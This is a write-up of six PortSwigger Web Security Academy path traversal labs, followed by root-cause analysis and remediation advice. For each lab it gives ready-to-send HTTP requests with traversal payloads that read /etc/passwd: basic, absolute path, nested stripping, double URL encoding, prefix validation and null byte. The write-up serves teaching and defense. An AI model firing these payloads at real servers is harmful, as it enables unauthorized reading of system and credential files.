# Path Traversal: Escaping the Intended Directory

## Platform

PortSwigger Web Security Academy

## Difficulty

Apprentice to Practitioner

## Vulnerability Category

Path Traversal / Directory Traversal — CWE-22

## Lab Objective

Exploit weaknesses in a product-image loading feature to retrieve `/etc/passwd` from outside the intended image directory.

This writeup covers the six Path Traversal labs, progressing from basic directory traversal to bypasses involving absolute paths, nested traversal sequences, double URL encoding, directory-prefix validation, and null bytes.

## Vulnerability Overview

A filename may appear to be a harmless input, but it becomes security-sensitive when an application uses it to decide which server-side file to open.

Path traversal occurs when user-controlled input allows a file operation to escape its intended directory. In these labs, the entry point is a product-image loader that accepts a `filename` parameter.

A legitimate request resembles:

```http
GET /image?filename=product.jpg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

If images are stored under `/var/www/images/`, the application should retrieve only an approved file within that directory.

However, the sequence `../` instructs filesystem path resolution to move to a parent directory. Without an effective containment check, an attacker can replace an image filename with a path that leads elsewhere.

For example:

```text
Intended file:
 /var/www/images/product.jpg

Attacker-controlled path:
 /var/www/images/../../../etc/passwd

Resolved destination:
 /etc/passwd
```

The later labs introduce filters and validation rules, but each defense fails to constrain the file ultimately opened.

The central question throughout the assessment is:

> After every decoding, filtering, and path-resolution step, which file will the application actually access?

The explanations below model PortSwigger's documented lab behavior; they do not rely on access to the applications' source code.

## Methodology

1. **Identify the file-loading functionality.**  
   Browse a product page and locate the request responsible for retrieving its image.

2. **Capture the request using Burp Suite.**  
   Open **Proxy → HTTP history**, identify the image-loading request, and send it to **Repeater**.

3. **Establish a baseline.**  
   Send the original request and inspect the normal image response before modifying the `filename` parameter.

4. **Test the applicable path-handling behavior.**  
   Depending on the lab, test relative traversal, absolute paths, nested sequences, encoded separators, required directory prefixes, or extension validation.

5. **Inspect the outgoing request.**  
   For encoded payloads, confirm that the raw request contains the intended percent sequences. Additional encoding or decoding can change the test.

6. **Verify the returned content.**  
   Look for recognizable account-file records in the response body and confirm the lab's solved indicator. An HTTP success status alone is insufficient evidence.

## Exploitation Steps

### 1. Basic Directory Traversal

**Lab:** File path traversal, simple case  
**Difficulty:** Apprentice

The image loader accepts directory traversal sequences without an effective restriction on the resulting file location.

Replace the image filename with:

```text
../../../etc/passwd
```

Each `../` moves up one directory. Using `/var/www/images/` as the illustrative starting directory, three parent-directory steps reach the filesystem root.

```text
/var/www/images/../../../etc/passwd
→ /etc/passwd
```

Send the modified request in Repeater and inspect the response for account-file contents.

**Why it works:** The application allows the filename to change the directory being accessed instead of limiting it to an approved image.

### 2. Absolute Path Bypass

**Lab:** File path traversal, traversal sequences blocked with absolute path bypass  
**Difficulty:** Practitioner

This application blocks traversal sequences but still permits an absolute filename.

Supply the target directly:

```text
/etc/passwd
```

An absolute Unix path begins at `/`, so the payload does not need any parent-directory segments.

**Why it works:** The filter focuses on traversal syntax while the file-loading operation still accepts a path outside the intended directory.

This behavior depends on the application's path-handling implementation. An absolute path does not universally override a base directory in every API or string-concatenation pattern.

### 3. Non-Recursive Traversal Stripping

**Lab:** File path traversal, traversal sequences stripped non-recursively  
**Difficulty:** Practitioner

The application removes traversal sequences in a single pass. A nested construction produces a valid traversal sequence after that removal.

Submit:

```text
....//....//....//etc/passwd
```

Each `....//` contains an inner `../`. Removing the inner sequence leaves another `../` behind:

```text
Before filtering: ....//
After filtering:  ../
```

Across the complete payload:

```text
....//....//....//etc/passwd
→ ../../../etc/passwd
```

**Why it works:** Filtering creates a dangerous output that is subsequently used without enforcing directory containment.

### 4. Superfluous URL-Decoding Bypass

**Lab:** File path traversal, traversal sequences stripped with superfluous URL-decode  
**Difficulty:** Practitioner

The application checks for traversal and then performs an additional URL decode before file access.

Submit double-encoded separators:

```text
..%252f..%252f..%252fetc/passwd
```

The relevant transformation is:

```text
%252f → %2f → /
```

The complete processing model is:

```text
Submitted value:
..%252f..%252f..%252fetc/passwd

After initial parameter decoding:
..%2f..%2f..%2fetc/passwd

After the additional decode:
../../../etc/passwd
```

**Why it works:** The security check evaluates a different representation from the one eventually consumed by the file operation. Later decoding restores the traversal separators.

### 5. Directory-Prefix Validation Bypass

**Lab:** File path traversal, validation of start of path  
**Difficulty:** Practitioner

The application receives a complete path and checks that it starts with the expected image directory.

Preserve the required prefix and append traversal segments:

```text
/var/www/images/../../../etc/passwd
```

The supplied string begins with `/var/www/images/`, satisfying the initial check. Filesystem resolution still processes the later parent-directory segments:

```text
Accepted prefix: /var/www/images/
Resolved target: /etc/passwd
```

**Why it works:** The application checks where the path text begins without checking where the complete path resolves.

### 6. Null Byte Extension Bypass

**Lab:** File path traversal, validation of file extension with null byte bypass  
**Difficulty:** Practitioner

The application requires the submitted filename to end with an image extension.

Place an encoded null byte before the permitted suffix:

```text
../../../etc/passwd%00.png
```

In the vulnerable behavior modeled by this lab, extension validation accepts `.png`, while subsequent file handling treats the null byte as the end of the filename.

```text
Value accepted by extension validation:
../../../etc/passwd[NULL].png

Effective pathname used for file access:
../../../etc/passwd
```

**Why it works:** Validation and file access disagree about where the filename ends.

This bypass requires vulnerable null-termination behavior. Many modern file APIs reject embedded null bytes, so the technique should not be assumed to work against every runtime.

### Verification

For each lab, successful exploitation is established by retrieving recognizable `/etc/passwd` contents and confirming the solved indicator.

A typical account-record structure is:

```text
username:password-placeholder:UID:GID:description:home-directory:shell
```

This describes the expected file format rather than reproducing a captured lab response.

`/etc/passwd` contains account metadata. Its disclosure demonstrates unauthorized file access; it does not by itself establish password-hash disclosure, arbitrary file writing, or code execution.

## Payloads

The requests below use a placeholder hostname. Each payload corresponds to its specific lab.

### Basic Traversal

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Absolute Path Bypass

```http
GET /image?filename=/etc/passwd HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Non-Recursive Stripping Bypass

```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Double URL-Encoding Bypass

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Directory-Prefix Bypass

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Null Byte Extension Bypass

```http
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

<!--
Insert your own exploit screenshots here using the application's Screenshots feature.

Useful evidence includes:
- The modified request showing the filename payload.
- The response containing /etc/passwd records.
- The lab's solved indicator.

The screenshots supplied as formatting references are not exploit evidence.
-->

## Root Cause

The shared root cause is insufficient control over the relationship between user input and filesystem access.

The application allows an untrusted filename to influence a sensitive operation without reliably proving that the selected file remains within the permitted directory.

Each lab exposes a different failure in that boundary:

| Implementation Weakness | Why the Defense Fails |
| --- | --- |
| Unrestricted filename handling | Parent-directory segments escape the image folder. |
| Blocking traversal sequences | Absolute paths select external files without using `../`. |
| One-pass sequence removal | Nested input becomes valid traversal after filtering. |
| Decoding after validation | Accepted input changes meaning before file access. |
| Checking the raw directory prefix | The path starts correctly but resolves outside the directory. |
| Checking the filename extension | Null termination causes validation and file access to interpret different effective filenames. |

These weaknesses illustrate a common design error: checking selected properties of a submitted string without enforcing the location of the file ultimately opened.

In a deployed application, the impact could extend to disclosure of configuration files, source code, or credentials readable by the application account. The accessible data depends on filesystem permissions and the available file operation.

## Remediation

### Use Server-Controlled File Mappings

Accept an image identifier and map it to an approved file on the server.

```text
Client input: image_id=42
Server mapping: 42 → approved product image
```

This reduces the need to accept filesystem paths from the client.

### Allowlist Accepted Input

Where filenames are necessary, restrict them to the application's expected values or a narrowly defined format. Reject invalid input rather than attempting to repair arbitrary paths with substring removal.

### Keep Decoding and Validation Consistent

Define a clear decoding pipeline. Security checks must apply to the representation used by file access, and later processing must not reinterpret accepted input into an unchecked path.

### Enforce Resolved-Path Containment

Use appropriate filesystem APIs to resolve the candidate path and verify that it remains beneath the approved directory.

The containment check must understand directory boundaries. A simple string-prefix comparison may also accept a similarly named sibling directory.

Account for symbolic links. Where paths can change concurrently, protect against changes between validation and opening the file.

### Reject Null Bytes and Invalid Path Data

Reject embedded null bytes and use file APIs that handle invalid filenames safely. Extension validation should supplement file-access controls rather than serve as the primary boundary.

### Apply Least Privilege

Run the application with only the filesystem permissions it requires. Restrict access to sensitive configuration, credentials, and unrelated application files to limit the consequences of a file-selection flaw.

## Key Takeaways

- **A small input can control a powerful operation.** An image filename becomes security-sensitive when it determines which server-side file is opened.

- **Blocking one payload does not prove safety.** The six labs demonstrate different ways to reach the same unauthorized destination.

- **Processing order matters.** Filtering and decoding can produce a value with a different meaning from the one originally validated.

- **Textual checks do not establish filesystem containment.** A required prefix or extension does not prove that the resolved file is permitted.

- **Evidence should establish the actual impact.** Recognizable file contents demonstrate disclosure more clearly than a response status or size alone.

- **Strong remediation controls file selection.** Approved mappings, consistent processing, resolved-path containment, and limited permissions address the underlying weakness.

## References

- [PortSwigger — Path Traversal Overview and Prevention](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger — Path Traversal Learning Path](https://portswigger.net/web-security/learning-paths/path-traversal)
- [Lab — File Path Traversal, Simple Case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
- [Lab — Absolute Path Bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
- [Lab — Traversal Sequences Stripped Non-Recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
- [Lab — Superfluous URL-Decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
- [Lab — Validation of Start of Path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
- [Lab — File Extension Validation with Null Byte Bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)